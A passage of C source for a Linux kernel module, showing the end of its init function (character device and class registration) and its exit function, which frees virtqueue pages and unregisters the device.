    driver_class = class_create(THIS_MODULE, DRIVER_NAME);
    if (IS_ERR(driver_class)) {
        unregister_chrdev(major_num, DEVICE_FILE_NAME);
        return PTR_ERR(driver_class);
    }
    driver_device = device_create(driver_class, NULL, MKDEV(major_num, 0), NULL, DEVICE_FILE_NAME);
    if (IS_ERR(driver_device)) {
        class_destroy(driver_class);
        unregister_chrdev(major_num, DEVICE_FILE_NAME);
        return PTR_ERR(driver_device);
    }
    g_vq_virt_addr = NULL;
    g_vq_phys_addr = 0;
    g_vq_pfn = 0;
    return 0;
 }

 static void __exit mod_exit(void) {
    /* silent unload; no dmesg output unless gold patterns were printed earlier */

     if (g_vq_virt_addr) {
         free_pages((unsigned long)g_vq_virt_addr, VQ_PAGE_ORDER);
         g_vq_virt_addr = NULL;
         g_vq_phys_addr = 0;
         g_vq_pfn = 0;
     }
     if (driver_device) {
         device_destroy(driver_class, MKDEV(major_num, 0));
     }
     if (driver_class) {
         class_unregister(driver_class);
         class_destroy(driver_class);
     }
     if (major_num >= 0) {
         unregister_chrdev(major_num, DEVICE_FILE_NAME);
     }
 }
 
 module_init(mod_init);
 module_exit(mod_exit);
